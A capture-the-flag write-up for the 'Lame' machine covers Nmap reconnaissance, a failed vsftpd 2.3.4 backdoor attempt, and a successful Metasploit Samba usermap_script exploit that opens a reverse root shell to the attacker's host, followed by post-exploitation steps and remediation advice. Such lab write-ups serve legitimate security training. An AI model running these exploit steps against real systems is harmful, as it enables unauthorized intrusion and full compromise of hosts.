# CTF Report: Lame

## Summary

This report documents the compromise of the target machine `10.129.17.184` in an authorized CTF environment. Initial enumeration identified several exposed services, including FTP, SSH, and Samba. The VSFTPD 2.3.4 backdoor module indicated that the target might be vulnerable, but exploitation did not create a session because the backdoor service on port `6200/TCP` could not be reached.

The successful attack path used the Samba `usermap_script` vulnerability via Metasploit. The exploit returned a command shell with `root` privileges, allowing access to both the user flag and root flag.

## Target Information

| Item | Value |
| --- | --- |
| Target IP | `10.129.17.184` |
| Attacker IP | `10.10.14.7` |
| Platform | Linux |
| CTF Machine | Lame |
| Final Privilege | `root` |

## Reconnaissance

An initial service/version scan was performed with Nmap:

```bash
nmap -sV -sC 10.129.17.184
```

Relevant discovered services:

| Port | Service | Version / Notes |
| --- | --- | --- |
| `21/tcp` | FTP | `vsftpd 2.3.4`; anonymous FTP login allowed |
| `22/tcp` | SSH | `OpenSSH 4.7p1 Debian 8ubuntu1` |
| `139/tcp` | NetBIOS/SMB | Samba `3.x - 4.x` |
| `445/tcp` | SMB | Samba `3.0.20-Debian` |

Nmap also reported:

```text
ftp-anon: Anonymous FTP login allowed
smb-security-mode: message signing disabled
smb-os-discovery: Unix Samba 3.0.20-Debian
```

## FTP Enumeration

FTP was running VSFTPD 2.3.4, which is associated with the well-known backdoor vulnerability CVE-2011-2523. Anonymous login was also enabled.

The Metasploit module was checked:

```text
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 10.129.17.184
set LHOST 10.10.14.7
check
```

The module reported:

```text
The target appears to be vulnerable. vsftpd 2.3.4 banner detected; backdoor may be present
```

However, running the exploit did not create a shell:

```text
Unable to connect to backdoor on 6200/TCP
Exploit completed, but no session was created.
```

This indicates that the FTP banner suggested a vulnerable version, but the backdoor was not reachable from the attacker machine during testing.

## Samba Exploitation

Samba was identified on ports `139` and `445`, with version `3.0.20-Debian`. This version is vulnerable to the Samba username map script command execution issue, commonly tracked as CVE-2007-2447.

The Metasploit module used:

```text
exploit/multi/samba/usermap_script
```

Module configuration:

```text
set RHOSTS 10.129.17.184
set RPORT 445
set LHOST 10.10.14.7
set LPORT 443
run
```

The exploit successfully opened a shell:

```text
Command shell session opened (10.10.14.7:443 -> 10.129.17.184:48901)
```

Privilege confirmation:

```bash
whoami
```

Result:

```text
root
```

## Post-Exploitation

After obtaining a root shell, the home directory for the user `makis` was checked:

```bash
cd /home/makis
ls
```

Result:

```text
user.txt
```

The root directory was then checked:

```bash
cd /root
ls
```

Result:

```text
Desktop
reset_logs.sh
root.txt
vnc.log
```

## Flags

| Flag | Location | Status |
| --- | --- | --- |
| User flag | `/home/makis/user.txt` | Found |
| Root flag | `/root/root.txt` | Found |

Flag values were intentionally omitted from this report.

## Vulnerabilities Identified

### 1. Samba Username Map Script Command Execution

| Field | Details |
| --- | --- |
| Affected Service | Samba |
| Affected Version | `3.0.20-Debian` |
| CVE | CVE-2007-2447 |
| Severity | Critical |
| Impact | Unauthenticated remote command execution as `root` |
| Exploited | Yes |

The Samba service was vulnerable to command injection through username map script handling. Exploiting this issue provided a root shell on the target.

### 2. VSFTPD 2.3.4 Backdoor

| Field | Details |
| --- | --- |
| Affected Service | FTP |
| Affected Version | `vsftpd 2.3.4` |
| CVE | CVE-2011-2523 |
| Severity | Critical |
| Impact | Potential unauthenticated remote shell |
| Exploited | No |

The FTP banner matched VSFTPD 2.3.4, and Metasploit reported that the target appeared vulnerable. However, the exploit failed because the expected backdoor listener on `6200/TCP` was not reachable because of firewall on the target.

## Remediation Recommendations

1. Upgrade Samba to a supported, patched version.
2. Disable or remove unsafe Samba username map script functionality.
3. Restrict SMB access to trusted internal hosts only.
4. Replace VSFTPD 2.3.4 with a clean, supported version.
5. Disable anonymous FTP access unless it is strictly required.
6. Apply host firewall rules to expose only required services.
7. Monitor authentication logs and service logs for suspicious command execution attempts.

## Conclusion

The target was fully compromised through the Samba `usermap_script` vulnerability. Although the FTP service appeared vulnerable based on its VSFTPD 2.3.4 banner, the working exploitation path was through Samba on port `445/TCP`. The exploit returned a root shell directly, which allowed retrieval of both `user.txt` and `root.txt`.
